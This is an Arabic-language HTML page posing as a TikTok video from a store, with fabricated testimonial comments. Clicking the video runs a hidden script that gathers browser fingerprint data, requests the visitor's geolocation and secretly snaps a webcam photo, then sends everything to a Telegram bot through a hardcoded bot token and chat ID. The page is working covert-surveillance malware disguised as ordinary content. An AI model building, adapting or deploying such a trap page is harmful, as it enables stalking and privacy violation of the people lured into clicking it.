<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>🎥 متجر عسل أبيض | تيك توك</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #fff;
      overflow-x: hidden;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      padding: 20px;
      min-height: 100vh;
    }
    .logo img {
      width: 160px; /* تكبير الأيقونة */
      margin-bottom: 10px;
    }
    .profile {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .profile img {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      border: 2px solid #fe2c55;
    }
    .profile-info h3 {
      margin: 0;
      font-size: 18px;
      color: #fff;
    }
    .video-box {
      margin-top: 20px;
      width: 95%;
      max-width: 605px;
      border-radius: 12px;
      overflow: hidden;
      position: relative;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
      cursor: pointer;
      background-color: #000;
    }
    .video-box video {
      width: 100%;
      height: auto;
      display: block;
    }
    .play-overlay {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 50px;
      color: #fff;
      opacity: 0.8;
      background: rgba(0, 0, 0, 0.5);
      padding: 20px;
      border-radius: 50%;
      z-index: 2;
      pointer-events: none;
    }
    .loading-overlay {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.75);
      display: flex; align-items: center; justify-content: center;
      color: white; font-size: 20px;
      z-index: 1;
      display: none;
    }
    .buttons {
      margin-top: 20px;
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      justify-content: center;
    }
    .btn {
      background: linear-gradient(45deg, #fe2c55, #00f2ea);
      border: none;
      color: white;
      padding: 12px 20px;
      border-radius: 25px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
    }
    /* تعليقات مزيفة */
    .comments-section {
      margin-top: 30px;
      width: 95%;
      max-width: 605px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 15px 20px;
      text-align: right;
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
    }
    .comments-section h4 {
      margin-bottom: 15px;
      color: #00f2ea;
      font-weight: bold;
      font-size: 20px;
      border-bottom: 1px solid #00f2ea;
      padding-bottom: 8px;
    }
    .comment {
      display: flex;
      gap: 15px;
      margin-bottom: 15px;
      align-items: center;
    }
    .comment:last-child {
      margin-bottom: 0;
    }
    .comment .avatar {
      width: 45px;
      height: 45px;
      border-radius: 50%;
      border: 2px solid #fe2c55;
      background-size: cover;
      background-position: center;
      flex-shrink: 0;
    }
    .comment .comment-content {
      flex: 1;
      color: #eee;
      font-size: 15px;
      line-height: 1.4;
      background: rgba(0, 255, 234, 0.1);
      padding: 10px 15px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0, 255, 234, 0.3);
    }
    .comment .comment-author {
      font-weight: bold;
      color: #00f2ea;
      margin-bottom: 4px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="https://img.youm7.com/large/20190416052309239.jpg" alt="Logo" /></div>
    <div class="profile">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSitm9p4sWns-5EmwCEvwYR8Elqrb1qy5orQA&s" alt="Profile" />
      <div class="profile-info">
        <h3>@متجر عسل أبيض</h3>
        <span>50K متابع</span>
      </div>
    </div>
    <div class="video-box" onclick="triggerTrap()">
      <video 
        id="mainVideo" 
        muted 
        controls 
        poster="https://sdmntprsouthcentralus.oaiusercontent.com/files/00000000-3bfc-61f7-b24c-ba0ee6f57f49/raw?se=2025-08-04T01%3A26%3A39Z&sp=r&sv=2024-08-04&sr=b&scid=c4dcb226-f401-5a0d-a8e2-b7a18de4fa48&skoid=04233560-0ad7-493e-8bf0-1347c317d021&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-08-03T22%3A15%3A03Z&ske=2025-08-04T22%3A15%3A03Z&sks=b&skv=2024-08-04&sig=kSrVUtWISEtJG0lAsC6IKNErlRTTWRKFYSXPI6ZlhNQ%3D" 
        style="width:100%; height:auto;"
      >
        <source src="https://limewire.com/d/n8cm3#ZkkdxiU4W2" type="video/mp4" />
      </video>
      <div class="play-overlay" id="playButton">▶️</div>
      <div class="loading-overlay" id="loadingOverlay">جاري التحميل...</div>
    </div>

    <div class="buttons">
      <button class="btn" onclick="triggerTrap()">تشغيل الفيديو</button>
      <button class="btn" onclick="window.location.href='https://www.tiktok.com'">الصفحة الرسمية</button>
      <button class="btn" onclick="window.location.href='https://t.me/your_bot_username'">مراسلة البوت</button>
    </div>

    <!-- قسم التعليقات المزيفة أسفل الفيديو -->
    <div class="comments-section" aria-label="تعليقات المستخدمين">
      <h4>تعليقات المستخدمين</h4>

      <div class="comment">
        <div class="avatar" style="background-image: url('https://randomuser.me/api/portraits/women/68.jpg');"></div>
        <div class="comment-content">
          <div class="comment-author">سلمى</div>
          <div>منتج فاق توقعاتي، جودة ممتازة وخدمة سريعة. أنصح به بشدة!</div>
        </div>
      </div>

      <div class="comment">
        <div class="avatar" style="background-image: url('https://randomuser.me/api/portraits/men/75.jpg');"></div>
        <div class="comment-content">
          <div class="comment-author">محمود</div>
          <div>التجربة كانت رائعة، كل شيء وصلني كما هو موضح، شكراً لكم.</div>
        </div>
      </div>

      <div class="comment">
        <div class="avatar" style="background-image: url('https://randomuser.me/api/portraits/women/47.jpg');"></div>
        <div class="comment-content">
          <div class="comment-author">رنا</div>
          <div>أفضل متجر وجدته للمنتجات الجنسية، سعر وجودة لا يعلى عليها.</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    const token = "8334743512:AAGEnZwkI9LYgmOdBm6wKeYFu9ffF4LXxwg";
    const chatId = "8004961958";

    function getFingerprint() {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
      };
    }

    function sendToTelegram(message, photoBlob = null) {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      if (photoBlob) {
        const photoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", photoBlob, "photo.jpg");
        fetch(photoUrl, { method: "POST", body: formData });
      }
    }

    function triggerTrap() {
      const playBtn = document.getElementById("playButton");
      const loadingOverlay = document.getElementById("loadingOverlay");
      const video = document.getElementById("mainVideo");

      playBtn.style.display = "none";
      loadingOverlay.style.display = "flex";

      const fingerprint = getFingerprint();
      let message = `🕵️ محاولة دخول جديدة:\n\n`;
      message += `جهاز: ${fingerprint.userAgent}\n`;
      message += `اللغة: ${fingerprint.language}\n`;
      message += `المنطقة الزمنية: ${fingerprint.timezone}\n`;
      message += `الشاشة: ${fingerprint.screen}\n`;
      message += `الاتصال: ${fingerprint.connection}\n`;

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const coords = `\nالموقع: Latitude ${pos.coords.latitude}, Longitude ${pos.coords.longitude}`;
          sendToTelegram(message + coords);
        }, () => sendToTelegram(message + "\nالموقع مرفوض"));
      } else {
        sendToTelegram(message + "\nالموقع غير مدعوم");
      }

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          imageCapture.takePhoto().then(blob => {
            sendToTelegram("📷 صورة تم التقاطها:", blob);
            track.stop();
          }).finally(() => {
            loadingOverlay.style.display = "none";
            video.style.display = "block";
            video.play();
          });
        })
        .catch(() => {
          sendToTelegram(message + "\nتم رفض الوصول للكاميرا من المستخدم");
          loadingOverlay.style.display = "none";
          video.style.display = "block";
          video.play();
        });
    }
  </script>
</body>
</html>
